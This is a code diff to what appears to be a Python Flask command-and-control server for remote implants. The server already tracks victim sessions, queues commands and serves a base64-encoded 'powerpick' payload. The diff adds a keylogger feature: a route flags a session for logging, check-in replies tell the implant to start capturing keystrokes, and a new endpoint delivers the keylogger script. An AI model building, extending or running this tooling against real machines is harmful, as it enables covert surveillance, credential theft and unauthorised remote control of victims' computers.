@@ -13,6 +13,9 @@ tasklist = {}
 global sleeplist
 sleeplist = {}
 
+global keylist
+keylist = []
+
 def add_host(guid, IP):
     ses[IP] = guid
 
@@ -49,6 +52,11 @@ def check_in():
         resp = Response()
         resp.headers["X-Tasks"] = command
         return resp, 204
+    elif ip in keylist:
+        keylist.remove(ip)
+        resp = Response()
+        resp.headers["X-Logging"] = True
+        return resp, 204
     else:
         return "", 200 # status code to inform to do nothing, stay still
 
@@ -71,7 +79,15 @@ def sessions():
 
 @app.route('/transfer', methods=['GET'])
 def transfer_powerpick():
-    with open("powerpick.py", "rb") as f:
+    with open("transfers/powerpick.py", "rb") as f:
+        content = f.read()
+        data = b64encode(content)
+    
+    return data, 200
+
+@app.route('/log', methods=['GET'])
+def transfer_keylogger():
+    with open("transfers/keylogger.py", "rb") as f:
         content = f.read()
         data = b64encode(content)
     
@@ -86,6 +102,14 @@ def set_sleep_time():
 
     return '{"status": "OK"}', 200
 
+
+@app.route('/keylogger', methods=['GET'])
+def keylogger():
+    ip = request.args.get('session')
+    keylist.append(ip)
+
+    return '{"status": "OK"}', 200
+
 @app.route('/exec', methods=['POST'])
 def exec_command():
     data = request.get_json()
@@ -93,6 +117,8 @@ def exec_command():
         tasklist[ip] = command
     
     return '{"status": "OK"}', 200
+
+
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8000)
